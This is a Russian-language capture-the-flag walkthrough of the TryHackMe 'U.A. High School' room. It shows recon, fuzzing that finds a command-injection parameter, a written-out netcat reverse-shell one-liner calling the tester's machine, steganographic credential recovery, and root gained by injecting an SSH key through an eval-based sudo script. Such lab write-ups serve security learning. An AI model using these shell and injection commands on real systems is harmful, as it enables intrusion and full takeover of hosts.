## U.A. High School
- https://tryhackme.com/room/yueiua

## Разведка

nmap -sC -sV
- Стандартные скрипты
- сканирование версий

```
└─$ nmap -sC -sV 10.66.173.4 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 14:47 +0300
Nmap scan report for 10.66.173.4
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:e8:44:30:08:be:08:d8:29:a4:1d:4a:f9:86:52:54 (RSA)
|   256 b7:f2:ab:d7:30:60:ce:44:41:1b:77:bf:d5:44:c6:ca (ECDSA)
|_  256 27:f6:c6:9d:18:ea:f1:e2:1a:54:6d:af:25:4d:80:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

На 80 порту:
<img width="1470" height="847" alt="Pasted image 20260115144918" src="https://github.com/user-attachments/assets/7aa93115-b633-4695-a98e-c6654875dccc" />


Если посмотрим на код страницы, то найдем директорию /assets
<img width="667" height="193" alt="Pasted image 20260115152618" src="https://github.com/user-attachments/assets/748a8909-0d4a-48c8-a2d7-1f9d0ce87bce" />

Разведка больше ничего не дала, XSS тп я не нашел.
Откроем BurpSuite 
<img width="1268" height="735" alt="Pasted image 20260115145723" src="https://github.com/user-attachments/assets/6065d9e0-aacc-4c41-9f37-5931c2815e1c" />


/assets/images/ дает 403 ошибку
Пробую другие запросы:
<img width="1268" height="729" alt="Pasted image 20260115145751" src="https://github.com/user-attachments/assets/05f4d25d-b673-4eb0-99ee-5f6b934f4381" />


<img width="1269" height="735" alt="Pasted image 20260115145705" src="https://github.com/user-attachments/assets/a8e133b8-de5e-49dd-90f4-c6c05de528e0" />


/index.php возвращает 200. можно попробовать перебрать параметры для этой страницы
## Эксплуатация

```
└─$ ffuf -u 'http://ua.thm/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ua.thm/assets/index.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

cmd                     [Status: 200, Size: 72, Words: 1, Lines: 1, Duration: 142ms]
```

Отлично! есть параметр cmd, возможно тут RCE - Remote Code Injection

Проверим разные команды через curl запросы
```
└─$ curl -s 'http://ua.thm/assets/index.php?cmd=id'
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK                                                                                                                                       

└─$ curl -s 'http://ua.thm/assets/index.php?cmd=pwd'
L3Zhci93d3cvaHRtbC9hc3NldHMK                                                                                                                                       

└─$ curl -s 'http://ua.thm/assets/index.php?cmd=whoami'
d3d3LWRhdGEK                                                                                                                                       

└─$ curl -s 'http://ua.thm/assets/index.php?cmd=id' | base64 -d
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Ответ кодируется в base64, но это не проблема, если есть RCE, то можно закинуть шелл

Открываем порт у себя
```
└─$ nc -lvnp 4444            
listening on [any] 4444 ...
```


Прокидываем команду для шелла
```
└─$ curl -s 'http://ua.thm/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.129.222 4444 >/tmp/f'
```

И мы внутри
```
└─$ nc -lvnp 4444            
listening on [any] 4444 ...
connect to [192.168.129.222] from (UNKNOWN) [10.66.173.4] 60248
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-66-173-4:/var/www/html/assets$ ls 
ls
images
index.php
styles.css
```

## USER
```
www-data@ip-10-66-173-4:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x  4 www-data www-data 4096 Dec 13  2023 .
drwxr-xr-x 14 root     root     4096 Jul  9  2023 ..
drwxrwxr-x  2 www-data www-data 4096 Jul  9  2023 Hidden_Content
drwxr-xr-x  3 www-data www-data 4096 Dec 13  2023 html
www-data@ip-10-66-173-4:/var/www$ cd Hidden_Content
cd Hidden_Content
www-data@ip-10-66-173-4:/var/www/Hidden_Content$ ls 
ls
cpassphrase.txt
www-data@ip-10-66-173-4:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
[REDACTED]
www-data@ip-10-66-173-4:/var/www/Hidden_Content$ cat passphrase.txt | base64 -d  
</www/Hidden_Content$ cat passphrase.txt | base64 -d
[REDACTED]
```

Смотрим что еще есть:
```
www-data@ip-10-66-173-4:/var/www/Hidden_Content$ cd /var/www/html/assets/images
</www/Hidden_Content$ cd /var/www/html/assets/images
www-data@ip-10-66-173-4:/var/www/html/assets/images$ ls
ls
oneforall.jpg
yuei.jpg
```

Скачиваем изображение oneforall.jpg,  yuei.jpg уже открывали, это пичка с сайта
```
└─$ wget 'http://ua.thm/assets/images/oneforall.jpg'
--2026-01-15 15:06:37--  http://ua.thm/assets/images/oneforall.jpg
Resolving ua.thm (ua.thm)... 10.66.173.4
Connecting to ua.thm (ua.thm)|10.66.173.4|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 98264 (96K) [image/jpeg]
Saving to: ‘oneforall.jpg’

oneforall.jpg                     100%[============================================================>]  95.96K   240KB/s    in 0.4s    

2026-01-15 15:06:38 (240 KB/s) - ‘oneforall.jpg’ saved [98264/98264]
```
Фото не открывается и найденый passphrase не подходит.

```
└─$ steghide extract -sf oneforall.jpg     
Enter passphrase: 
steghide: the file format of the file "oneforall.jpg" is not supported.
```
На этом этапе я вернулся к ресерчу системы в надежде найти еще что-то к чему нужен найденный ключ, но в итоге решил почитать про изображение и то как они работают. 
У каждого файлового формата есть **магическая сигнатура** — первые байты файла, по которым программы определяют тип. Когда программа открывает файл она не смотрит на расширение .png или .jpg. Сначала читаются первые байты => определение формата => вызов нужного декодера.
В нашем изображении магические параметры были изменены.
на Вики я нашел сигнатуры jpg 
<img width="1358" height="632" alt="Pasted image 20260115153142" src="https://github.com/user-attachments/assets/1551c069-f034-4422-8500-9b214820c112" />

и заменил **89 50 4E 47 0D 0A 1A 0A** на  **FF D8 FF E0 00 10 4A 46**. через:
```
└─$ hexeditor -b oneforall.jpg
```

<img width="1358" height="632" alt="Pasted image 20260115153142" src="https://github.com/user-attachments/assets/5460bfd5-ed93-4a5a-8f76-6dbc6a91e9bf" />

И наше изображение открылось

<img width="1031" height="559" alt="Pasted image 20260115151108" src="https://github.com/user-attachments/assets/cca74978-3370-495d-9e21-94519196ac20" />

Теперь пробуем найти скрытые данные
```
└─$ steghide extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
                                                                                                                                      
└─$ cat creds.txt                           
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:[REDACTED]
```

И подключаемся по SSH
```
└─$ ssh deku@ua.thm
```
```
deku@ip-10-66-173-4:~$ cat user.txt
THM{REDACTED}
```

## ROOT
Смотрим что умеем
```
deku@ip-10-66-173-4:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on ip-10-66-173-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on ip-10-66-173-4:
    (ALL) /opt/NewComponent/feedback.sh
```

Имеем доступ к файлу feedback.sh, прочитаем и посмотрим что делает файл
```sh
deku@ip-10-66-173-4:~$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

```bash
eval "echo $feedback"
```

Эта функция eval будет выполнять произвольную команду => через нее мы можем повысить привилегии, и, например, переписать ssh ключ root пользователя

Сгенерируем у себя на машине ssh ключ
```
└─$ ssh-keygen -t rsa -b 4096 -f id_rsa 
```

Скопируем id_rsa.pub и вставим в ввод кода на атакуемой машине добавим > /root/.ssh/authorized_keys для записи в ключи root пользователя
```
deku@ip-10-66-173-4:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC3I8aCvcVEPk9iutFxrkcbfNtsZk2g8HDhHbDblr1Ts1krMISRAVD1WLSHyDCMimladf6elf0oU55OlH+wkhTUjfanBl9zynZQoAlpPtEcEfoJegE63ugAU8yiSO1QBbcALYMeYA8Us3QwjO6BF2ghUUGnMAncheBcy5uQ3uexAvVvFPk3NiQaB9ETDh91jh68Ly1w/UUfMqPPwgu71TUFk48R0JFiWR4isxqYryOf1S2/ez7PKMavX6XpBPtompCNtC4mbcOWQIlAFq82kVJDcWdFaNmnG0ycTPNULxTDuWz7Fn4dwrn3t/opeH5uTBtpp565ITF5F3uW6Ind529gfe9HBsf0hPMn6uOVQygakiVVI35SjyjnnfRsYeTV/d8xvkJfGDONHBEG+Lzh5yjT2+BRe/H3kXKxX012xXOy9+U7B9+3DWzNJ2Pa8tb95vCYHZ/cpYX+RdJpBX5scGKbBMHhLN8W+2uVURycXCTalzr6V//vfNWyNmVLAHXZt7MkiE4VyB34VYp55BJAZc3KUS3hTv1Ev2x19MAMUJ7akEVt5me1MN5iVkV0+35djAXfz2xjllXqGGA6nWJreqcLK4DpVW/i7EpF2N/tukEZwVoapq0AvZuTmPoFTJmsl2kbsQ/CVmC1xwdqi8Fsm+dPONkkwpi+cNhM9bbLZn5TJw== @kali > /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.
```

И теперь подключаемся по ssh от имени root

```
└─$ ssh root@ua.thm -i id_rsa
```

И читаем наш root флаг
```
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___              | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{REDACTED}

root@ip-10-66-173-4:~# Connection to ua.thm closed by remote host.
Connection to ua.thm closed.

```
